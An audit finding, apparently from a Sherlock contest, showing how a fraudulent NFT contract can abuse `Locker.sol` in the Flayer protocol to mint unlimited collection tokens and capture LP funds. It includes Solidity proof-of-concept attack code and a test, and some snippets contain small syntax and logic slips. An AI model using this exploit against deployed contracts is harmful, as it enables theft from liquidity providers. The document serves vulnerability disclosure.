# Fraudulent collections can mint infinite collection tokens after they are created, but before they are initialized in `Locker.sol`

### Summary

A collection contract implementing the right logic can mint an infinite amount of collection tokens before it is initialized through `Locker.sol`'s `deposit()` function while maintaining the appearance and functionality of a legitimate NFT contract.

### Root Cause

`Locker.sol`'s [`deposit()` function](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/Locker.sol#L144) calls `transferFrom()` on an address passed to the function. A contract at this address can call `createCollection()` on the Locker, pass its own address as the collection address, circumvent the `supportsInterface()` check, and establish itself as an existing but uninitialized collection. Then, it can bypass the `collectionExists()` check in `deposit()`, logically circumvent the `transferFrom()` callback, and receive as many collection tokens are specified according to `_tokenIds.length`. The logic required does not impact the collection's compatibility with the protocol or tradability, so it may appear completely legitimate.

### External Pre-Conditions
Any quantity of the Locker's native token is swapped into the LP

### Attack Path

BORED_APES, our malicious collection, is a copy of the ERC721 contract with a few modifications:

### 1. The `transferFrom()` function:
```solidity
function transferFrom(address from, address to, uint256 tokenId) public virtual override returns (bool) {

        if (from == address(this)) {
            return true;
        }

        require(_isApprovedOrOwner(_msgSender(), tokenId), "ERC721: caller is not token owner or approved");

        _transfer(from, to, tokenId);
    }
```
This function is modified to return `true` if transfers are being made out of the contract. This way, when `address(AttackLocker)` is passed to `deposit()`, all `transferFrom()` calls made on it will simply return `true` without doing anything. This part of the function is skipped, and now the function will mint to an address of our choosing as many `BORED_APES` collection tokens as we specify in `uint[] calldata tokenIds`. 

### 2. Attack Logic:
```solidity
    ILocker locker;

    /**
     * @dev Initializes the contract by setting a `name` and a `symbol` to the token collection.
     */
    constructor(string memory name_, string memory symbol_, address _locker) {
        _name = name_;
        _symbol = symbol_;
        locker = ILocker(_locker);
    }

    function attack(uint160 price, address attacker) external {
        uint[] memory tokenIdsForDeposit = new uint[](1000);
        uint[] memory tokenIdsForInit = new uint[](10);

        locker.createCollection(address(this), "BORED_APES (REAL)", "APE", 1);
        locker.deposit(address(this), tokenIdsForDeposit, address(attacker);
        locker.initializeCollection(address(this), 1 ether, tokenIdsForInit, 100 ether, price);
        
        for (uint i; i < 10; ++i) {
            _mint(address(locker), i);
        }
        
    }
```
1. The address of the Locker is given a simple interface, passed into the constructor, and initialized.
2. `createCollection()` is called, passing the contract's address.
3. `attack()` is called from an external address.
4. `deposit()` is called on the locker, which will mint as many BORED_APES collection tokens as `tokenIdsForDeposit.length` to an address of our choosing (in this case, `attacker`)
5. The contract is given a supply of the Locker's native tokens (WETH in the test case) and allowed to spend them, so that a WETH/CollectionToken LP may be established.
6. The collection is initialized, transferring the ETH and minting 10 (minimum collection size) BORED_APES collection tokens to the LP.
7. Since the collection cannot transfer tokens out of itself, we mint 10 BORED_APES to the locker.

Now that we have 10 BORED_APES in the Locker and 100 times their worth in collection tokens all to ourselves, any additional WETH deposited to the LP is ours at no cost.



### Impact

Attackers can establish collections that appear legitimate, but their entire market cap is effectively controlled by the attacker.

### PoC

I provided all the relevant logical snippets of my PoC above. The entire contract is several hundred lines, so it's a little long for this format. I would be happy to provide any clarifications or post it somewhere if needed.

The test (written in `Locker.t.sol`):
```solidity
function test_AttackLocker(uint8 _tokens) public {

        attackLocker = new AttackLocker("BORED_APES (REAL)", "APE", address(locker));
        _dealNativeToken(address(attackLocker), 1 ether);
        _approveNativeToken(address(attackLocker), address(locker), type(uint).max);
        attackLocker.attack(SQRT_PRICE_1_2, address(this));

        // LP has 100 collection tokens, we have 10000. Locker has 10 BORED_APES
        assertEq(locker.collectionToken(address(attackLocker)).balanceOf(address(this)), 10000 ether);
        assertApproxEqAbs(locker.collectionToken(address(attackLocker)).balanceOf(address(uniswapImplementation)), 100 ether, 3 ether);
        assertEq(attackLocker.balanceOf(address(locker)), 10);
    }
```
